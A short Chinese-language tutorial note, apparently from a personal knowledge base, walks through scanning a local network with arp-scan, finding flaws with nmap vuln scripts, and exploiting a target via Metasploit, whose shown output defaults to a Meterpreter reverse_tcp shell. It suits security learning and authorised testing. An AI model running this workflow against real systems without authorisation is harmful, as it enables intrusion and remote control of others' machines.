若需扫描当前网段主机，可以使用[[arp-scan]]扫描主机

```
arp-scan -l
```

在发现主机后我们可以使用[[nmap]]脚本扫描可被利用的漏洞

```
nmap --script=vuln target
```

在扫描到可被利用的漏洞后，使用[[Metasploit]]对其进行攻击
在使用[[Metasploit]]之前我们需要使用以下命令开始其交互

```
msfconsole
```

我们需要在[[Metasploit]]中搜索其中可用的攻击`payload`

```
search [关键词]
```

在搜索到结果后，我们需要挑选其中匹配的项目

```
use [使用编号，名称均可]
```

```
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

show options

仅需设置需要的参数

`RPORT` `LHOST` 已经设置好，所以不需要再次设置
其中仅需设置`RHOSTS`参数，那么

```
set RHOSTS [远端地址]
```

设置完成后，即可开始

```
run
```
